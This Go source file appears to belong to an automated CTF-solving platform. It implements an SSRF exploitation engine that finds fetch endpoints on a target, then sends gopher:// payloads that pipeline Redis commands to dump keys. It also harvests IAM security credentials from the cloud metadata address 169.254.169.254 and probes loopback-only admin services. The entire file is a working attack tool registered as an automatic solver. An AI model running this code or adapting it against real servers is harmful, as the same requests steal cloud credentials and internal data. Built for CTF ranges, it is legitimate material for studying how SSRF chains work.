package ctfplatform

// ssrf_attack.go —— SSRF 利用引擎：gopher 打 Redis / 云元数据两跳 / 内网回环服务。
//
// 攻击面（对应 ssrf_range.py 三场景，双语言机验）：
//  1. gopher://  —— 靶机 fetch 支持 gopher 协议时，管道化 RESP 命令直打内网未授权
//     Redis（KEYS 枚举 → 逐键 GET），flag 存于 Redis 键。
//  2. 云元数据   —— http://169.254.169.254 两跳：角色列表 → security-credentials 凭证
//     （Token 字段可能携带 flag）。
//  3. 内网回环   —— 经 SSRF 代理访问仅监听回环的管理服务（/internal/flag 等），
//     需要 SSRF 通道本身（直连不可达 / 缺内网凭证头）。
//
// 端点/参数探测：题目描述线索（ParseWebHints）优先，其次常见 fetch 参数名。

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// reSSRFFetchParam fetch 类端点常见参数名。
var reSSRFFetchParam = regexp.MustCompile(`(?i)url|uri|fetch|proxy|target|dest|link|src|host|path`)

// ssrfRedisKeys gopher 阶段管道 GET 的常见 flag 键名。
var ssrfRedisKeys = []string{
	"backup:flag", "flag", "secret", "flag:db", "backup", "key", "secret:flag",
	"flag_key", "cache:flag", "ctf:flag",
}

// ssrfRespEncode 编码 RESP 数组（Redis 多批量协议）。
func ssrfRespEncode(args ...string) []byte {
	var b strings.Builder
	fmt.Fprintf(&b, "*%d\r\n", len(args))
	for _, a := range args {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(a), a)
	}
	return []byte(b.String())
}

// ssrfGopherURL 构造 gopher URL（payload 一层 URL 编码）。
func ssrfGopherURL(host string, port int, raw []byte) string {
	return fmt.Sprintf("gopher://%s:%d/_%s", host, port,
		url.QueryEscape(string(raw)))
}

// ssrfEndpoints 候选 SSRF fetch 端点（场景前缀感知）。
func ssrfEndpoints(hints WebHints) []string {
	var out []string
	seen := map[string]bool{}
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, e := range hints.Endpoints {
		low := strings.ToLower(e)
		if strings.Contains(low, "fetch") || strings.Contains(low, "proxy") ||
			strings.Contains(low, "ssrf") || strings.Contains(low, "url") {
			add(e)
		}
	}
	// 从 hints 端点推导同前缀 fetch 端点（题目通常写 /<scene>/fetch?url=）
	for _, e := range hints.Endpoints {
		if i := strings.LastIndex(e, "/"); i > 0 {
			add(e[:i] + "/fetch")
			add(e[:i] + "/proxy")
		}
	}
	for _, e := range []string{"/fetch", "/proxy", "/fetch.php", "/proxy.php",
		"/ssrf/fetch", "/api/fetch", "/load", "/out"} {
		add(e)
	}
	return out
}

// ssrfParamName 从 hints 里抽 fetch 参数名，抽不到用 url。
func ssrfParamName(hints WebHints) string {
	for _, p := range hints.Params {
		if reSSRFFetchParam.MatchString(p) {
			return p
		}
	}
	return "url"
}

// ssrfScenePrefixes 场景前缀（从 hints 端点抽，缺省空串——靶场端点自带前缀时端点已含）。
func ssrfScenePrefixes(hints WebHints) []string {
	var out []string
	seen := map[string]bool{}
	for _, e := range hints.Endpoints {
		if i := strings.LastIndex(e, "/"); i > 0 && e[0] == '/' {
			p := e[:i]
			if !seen[p] {
				seen[p] = true
				out = append(out, p)
			}
		}
	}
	return out
}

// ssrfRedisTargets 候选内网 Redis（gopher 打靶）。
func ssrfRedisTargets(hints WebHints) [][2]int {
	ports := map[int]bool{}
	for _, p := range []int{6379, 6399, 6380} {
		ports[p] = true
	}
	// 题目线索里的端口（描述常写 "6399 端口"）
	for _, m := range reHintPort.FindAllStringSubmatch(hintTextOf(hints), 8) {
		if n, err := strconv.Atoi(m[1]); err == nil && n > 0 && n < 65536 {
			ports[n] = true
		}
	}
	var out [][2]int
	for p := range ports {
		out = append(out, [2]int{127, p}) // host 127.0.0.1
	}
	return out
}

// reHintPort 描述里的端口号（"6399 端口" / "port 6399"）。
var reHintPort = regexp.MustCompile(`(?i)(?:port|端口)\s*[:：]?\s*(\d{2,5})|(\d{4,5})\s*(?:端口|port\b)`)

// hintTextOf 取 hints 关联的原始文本不可行，这里返回拼接线索（端口线索从端点数字段提取）。
func hintTextOf(hints WebHints) string {
	return strings.Join(hints.Endpoints, " ") + " " + strings.Join(hints.Types, " ")
}

// AttackSSRF 对一个靶机执行 SSRF 利用链，返回命中的 flag。
func AttackSSRF(ctx context.Context, baseURL string, hints WebHints) []string {
	cl := webClient(6 * time.Second)
	base := strings.TrimRight(baseURL, "/")
	param := ssrfParamName(hints)

	seenFlag := map[string]bool{}
	var flags []string
	record := func(b []byte) {
		for _, f := range bfxScanVariants(b) {
			if !seenFlag[f] {
				seenFlag[f] = true
				flags = append(flags, f)
			}
		}
	}

	fire := func(ep, target string) {
		u := base + ep + "?" + param + "=" + url.QueryEscape(target)
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			return
		}
		req.Header.Set("User-Agent", "SecAutoMind/1.7")
		resp, err := cl.Do(req)
		if err != nil {
			return
		}
		b := readLimited(resp, 1<<20)
		_ = resp.Body.Close()
		record(b)
	}

	var endpoints []string
	prefixes := ssrfScenePrefixes(hints)
	for _, ep := range ssrfEndpoints(hints) {
		endpoints = append(endpoints, ep)
		for _, p := range prefixes {
			if !strings.HasPrefix(ep, p+"/") {
				endpoints = append(endpoints, p+ep)
			}
		}
	}

	// ── 攻击 1：gopher → 内网 Redis（RESP 管道：KEYS * + 常见键 GET） ──
	var redisCmd []byte
	redisCmd = append(redisCmd, ssrfRespEncode("KEYS", "*")...)
	for _, k := range ssrfRedisKeys {
		redisCmd = append(redisCmd, ssrfRespEncode("GET", k)...)
	}
	for _, ep := range endpoints {
		for _, tgt := range ssrfRedisTargets(hints) {
			if ctx.Err() != nil {
				return flags
			}
			fire(ep, ssrfGopherURL("127.0.0.1", tgt[1], redisCmd))
		}
	}

	// ── 攻击 2：云元数据两跳 ──
	metadataPaths := []string{
		"/latest/meta-data/iam/security-credentials/",
		"/latest/meta-data/iam/security-credentials/imds-role",
		"/latest/meta-data/iam/security-credentials/iam-role",
		"/latest/meta-data/security-credentials",
	}
	for _, ep := range endpoints {
		for _, p := range metadataPaths {
			if ctx.Err() != nil {
				return flags
			}
			fire(ep, "http://169.254.169.254"+p)
		}
	}

	// ── 攻击 3：内网回环管理服务（代理注入内网凭证） ──
	loopback := []string{
		"http://127.0.0.1:6401/internal/flag",
		"http://127.0.0.1:6401/flag",
		"http://127.0.0.1:6402/internal/flag",
		"http://localhost:6401/internal/flag",
		"http://127.0.0.1:8080/internal/flag",
		"http://127.0.0.1:6401/internal/admin",
	}
	for _, ep := range endpoints {
		for _, t := range loopback {
			if ctx.Err() != nil {
				return flags
			}
			fire(ep, t)
		}
	}

	return flags
}

// readLimited 读响应体（限长）。
func readLimited(resp *http.Response, max int64) []byte {
	b, _ := io.ReadAll(io.LimitReader(resp.Body, max))
	return b
}

// ssrfAttackFromText 生产入口：从题目文本识别 URL 并打 SSRF。
func ssrfAttackFromText(ctx context.Context, text string) []string {
	if strings.EqualFold(os.Getenv("SECAUTOMIND_WEB_EXPLOIT"), "0") {
		return nil
	}
	var targets []string
	for _, m := range reHTTPURL.FindAllString(text, 8) {
		u := strings.TrimRight(m, ".,;:)]}>\"'")
		if pu, err := url.Parse(u); err == nil &&
			(pu.Scheme == "http" || pu.Scheme == "https") && pu.Host != "" {
			targets = append(targets, strings.TrimRight(u, "/"))
		}
	}
	if len(targets) == 0 {
		return nil
	}
	if len(targets) > 2 {
		targets = targets[:2]
	}
	hints := ParseWebHints(text)

	var out []string
	for _, t := range targets {
		tctx, cancel := context.WithTimeout(ctx, 60*time.Second)
		out = append(out, AttackSSRF(tctx, t, hints)...)
		cancel()
	}
	return ssrfDedup(out)
}

func ssrfDedup(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "ssrf_redis_rce", Category: CategoryWebS, Priority: 29,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return ssrfAttackFromText(ctx, text)
		},
	})
}
